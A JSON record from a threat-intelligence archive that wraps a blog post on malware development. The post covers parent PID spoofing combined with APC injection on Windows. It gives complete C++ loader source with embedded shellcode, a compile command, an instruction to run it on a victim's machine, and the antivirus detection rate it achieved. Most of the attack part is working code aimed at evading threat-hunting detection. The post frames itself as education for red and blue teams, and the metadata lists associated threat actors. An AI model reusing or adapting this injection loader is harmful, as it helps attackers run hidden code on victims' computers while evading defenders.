@@ -1,0 +1,96 @@
+{
+    "id": "46ab209f-6423-4e6b-b236-b5602a6b978c",
+    "created_at": "2023-01-12T15:02:27.462027Z",
+    "updated_at": "2025-03-27T02:12:44.258393Z",
+    "deleted_at": null,
+    "sha1_hash": "0f63f09e33a989a84e91052e3637a1335123b8c8",
+    "title": "2022-09-06 - Malware development tricks- parent PID spoofing. Simple Cplusplus example.",
+    "authors": "",
+    "file_creation_date": "2022-11-28T19:05:50Z",
+    "file_modification_date": "2022-11-28T19:05:50Z",
+    "file_size": 1658791,
+    "plain_text": "# Malware development tricks: parent PID spoofing. Simple C++ example.\n\n**[cocomelonc.github.io/malware/2022/09/06/malware-tricks-23.html](https://cocomelonc.github.io/malware/2022/09/06/malware-tricks-23.html)**\n\nSeptember 6, 2022\n\n### 4 minute read\n\n ﷽\n\n Hello, cybersecurity enthusiasts and white hackers!\n\n This article is the result of my own investigation into interesting trick: parent process ID spoofing.\n\n## parent PID spoofing\n\n### Monitoring the relationships between parent and child processes is a common method used by threat hunting teams to identify malicious activities. Red teams have adopted parent PID spoofing as a method of evasion. The CreateProcess Windows API call supports a parameter that allows the user to specify the Parent PID. This means that a malicious process can use a different parent than the one being executed when it is created.\n\n## practical example\n\n\n-----\n\n### Let s look at a practical example. First of all, let s say that we have some process, like\n```\nmspaint.exe :\n\n As you can see, PID is 3396 . If we look at its parent process (PID: 2876 ), we can see\nexplorer.exe :\n\n```\n\n-----\n\n### Also we can see via Process Hacker that current directory is C:\\Windows\\System32\\ :\n\n\n-----\n\n### Then, the execution flow of this trick is detailed in the following steps:\n\n I got explorer.exe PID:\n```\nint pid = findMyProc(argv[1]);\n\nif (pid) {\n\n printf(\"PID = %d\\n\", pid);\n\n}\n\nHANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)pid);\n\n Create process mspaint.exe :\nCreateProcessA(\"C:\\\\Windows\\\\System32\\\\mspaint.exe\", NULL, NULL, NULL, TRUE,\nCREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,\nreinterpret_cast<LPSTARTUPINFOA>(&si), &pi);\n\nLPVOID ba = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000, MEM_RESERVE |\nMEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n```\n\n-----\n\n### Write meow-meow payload to created process memory:\n```\nBOOL res = WriteProcessMemory(pi.hProcess, ba, (LPVOID)my_payload,\nsizeof(my_payload), nb);\n\n Add a user-mode asynchronous procedure call (APC) object to the APC queue of the thread of the created process:\nQueueUserAPC((PAPCFUNC)ba, pi.hThread, 0);\n\n Resume thread:\nResumeThread(pi.hThread);\n\nCloseHandle(pi.hThread);\n\n So, the full source code of this trick is:\n\n```\n\n-----\n\n```\n/\nhack.cpp\n\nparent PID spoofing with APC\n\nauthor: @cocomelonc\n\nhttps://cocomelonc.github.io/malware/2022/09/06/malware-tricks-23.html\n\n*/\n#include <windows.h>\n\n#include <tlhelp32.h>\n\n#include <iostream>\n\nint findMyProc(const char *procname) {\n\n HANDLE hSnapshot;\n\n PROCESSENTRY32 pe;\n\n int pid = 0;\n\n BOOL hResult;\n\n // snapshot of all processes in the system\n\n hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\n if (INVALID_HANDLE_VALUE == hSnapshot) return 0;\n\n // initializing size: needed for using Process32First\n pe.dwSize = sizeof(PROCESSENTRY32);\n\n // info about first process encountered in a system snapshot\n\n hResult = Process32First(hSnapshot, &pe);\n\n // retrieve information about the processes\n\n // and exit if unsuccessful\n\n while (hResult) {\n\n  // if we find the process: return process ID\n\n  if (strcmp(procname, pe.szExeFile) == 0) {\n\n   pid = pe.th32ProcessID;\n\n   break;\n\n  }\n\n  hResult = Process32Next(hSnapshot, &pe);\n\n }\n\n // closes an open handle (CreateToolhelp32Snapshot)\n\n CloseHandle(hSnapshot);\n\n return pid;\n\n}\n\n\nint main(int argc, char* argv[]) {\n\n unsigned char my_payload[] =\n\n // 64-bit meow-meow messagebox\n\n \"\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\"\n\n \"\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\"\n\n \"\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\"\n\n \"\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\"\n\n \"\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\"\n\n```\n\n-----\n\n```\n \\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\n\n \"\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\"\n\n \"\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\"\n\n \"\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\"\n\n \"\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\"\n\n \"\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\n \"\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\"\n\n \"\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\"\n\n \"\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\"\n\n \"\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\"\n\n \"\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x49\\xc7\"\n\n \"\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x1a\\x01\\x00\\x00\\x3e\"\n\n \"\\x4c\\x8d\\x85\\x25\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\\x45\\x83\"\n\n \"\\x56\\x07\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\"\n\n \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\n \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\n \"\\xd5\\x4d\\x65\\x6f\\x77\\x2d\\x6d\\x65\\x6f\\x77\\x21\\x00\\x3d\\x5e\"\n\n \"\\x2e\\x2e\\x5e\\x3d\\x00\";\n\n STARTUPINFOEXA si;\n\n PROCESS_INFORMATION pi;\n\n SIZE_T st;\n\n int pid = findMyProc(argv[1]);\n\n if (pid) {\n\n  printf(\"PID = %d\\n\", pid);\n\n }\n\n HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)pid);\n\n ZeroMemory(&si, sizeof(STARTUPINFOEXA));\n\n InitializeProcThreadAttributeList(NULL, 1, 0, &st);\n\n si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0,\nst);\n\n InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &st);\n\n UpdateProcThreadAttribute(si.lpAttributeList, 0,\nPROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);\n\n si.StartupInfo.cb = sizeof(STARTUPINFOEXA);\n\n CreateProcessA(\"C:\\\\Windows\\\\System32\\\\mspaint.exe\", NULL, NULL, NULL, TRUE,\nCREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,\nreinterpret_cast<LPSTARTUPINFOA>(&si), &pi);\n\n LPVOID ba = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000, MEM_RESERVE |\nMEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n SIZE_T *nb = 0;\n\n BOOL res = WriteProcessMemory(pi.hProcess, ba, (LPVOID)my_payload,\nsizeof(my_payload), nb);\n\n QueueUserAPC((PAPCFUNC)ba, pi.hThread, 0);\n\n ResumeThread(pi.hThread);\n\n CloseHandle(pi.hThread);\n\n\n```\n\n-----\n\n```\n return 0;\n\n}\n\n### As you can see, I reused my code from this and this posts.\n\n Here I have hardcoded a bit the process which being started, you can modify it so that it accepts it from the command-line arguments\n\n## demo\n\n### Let’s go to see everything in action. Compile our “malware”:\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mwindows -I/usr/share/mingww64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fnoexceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n\n Then run it on the victim’s machine:\n.\\hack.exe explorer.exe\n\n```\n\n-----\n\n### Run Process Hacker and as you can see, mspaint.exe process successfully created (PID:\n```\n4720 ):\n\n```\n\n-----\n\n### And:\n\n\n-----\n\n-----\n\n### as you can see, parent process is 2876 which is corresponds to explorer.exe, but current directory is Z:\\2022-09-06-malware-tricks-23 !\n\n And what is in the process memory?\n\n\n-----\n\n### So everything is work perfectly :)\n\n Actually I deceived you a little. in my example goes not just parent process spoofing. It’s a combination of PPID spoofing and APC injection. Because I am also learning new things like you and sometimes you need to ask yourself questions and don’t be afraid to experiment.\n\n Let’s go to upload hack.exe to VirusTotal:\n\n\n-----\n\n### So, 20 of 70 AV engines detect our file as malicious.\n\n https://www.virustotal.com/gui/file/3ec9f1080253f07695f0958ae84e99ff065f052c409f0f7e3e1 a79cd4385a9d5/detection\n\n This technique is used in Cobalt Strike and KONNI RAT. For example Cobalt Strike can spawn processes with alternate PPIDs.\n\n Originally this technique was introduced into the wider information security audience in 2009 by Didier Stevens\n\n I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal.\n\n Didier Stevens: That Is Not My Child Process! MITRE ATT&CK: Parent PID spoofing Cobalt Strike KONNI CreateProcessA Find process ID by name and inject to it APC injection technique source code in github\n\n\n-----\n\n### This is a practical case for educational purposes only.\n\n Thanks for your time happy hacking and good bye!\n PS. All drawings and screenshots are mine\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-06 - Malware development tricks- parent PID spoofing. Simple Cplusplus example..pdf"
+    ],
+    "report_names": [
+        "2022-09-06 - Malware development tricks- parent PID spoofing. Simple Cplusplus example..pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "b43c8747-c898-448a-88a9-76bff88e91b5",
+            "created_at": "2024-02-02T02:00:04.058535Z",
+            "updated_at": "2025-03-27T02:00:03.302832Z",
+            "deleted_at": null,
+            "main_name": "Opal Sleet",
+            "aliases": [
+                "OSMIUM",
+                "Konni",
+                "Vedalia"
+            ],
+            "source_name": "MISPGALAXY:Opal Sleet",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "b9458777-d970-4e89-b2d2-e532140a390f",
+            "created_at": "2024-05-01T02:03:08.140328Z",
+            "updated_at": "2025-03-27T02:05:17.41728Z",
+            "deleted_at": null,
+            "main_name": "NICKEL JUNIPER",
+            "aliases": [
+                "OSMIUM ",
+                "Opal Sleet ",
+                "Konni"
+            ],
+            "source_name": "Secureworks:NICKEL JUNIPER",
+            "tools": [
+                "KONNI"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535747,
+    "ts_updated_at": 1743041564,
+    "ts_creation_date": 1669662350,
+    "ts_modification_date": 1669662350,
+    "files": {
+        "pdf": "https://archive.orkl.eu/0f63f09e33a989a84e91052e3637a1335123b8c8.pdf",
+        "text": "https://archive.orkl.eu/0f63f09e33a989a84e91052e3637a1335123b8c8.txt",
+        "img": "https://archive.orkl.eu/0f63f09e33a989a84e91052e3637a1335123b8c8.jpg"
+    }
+}
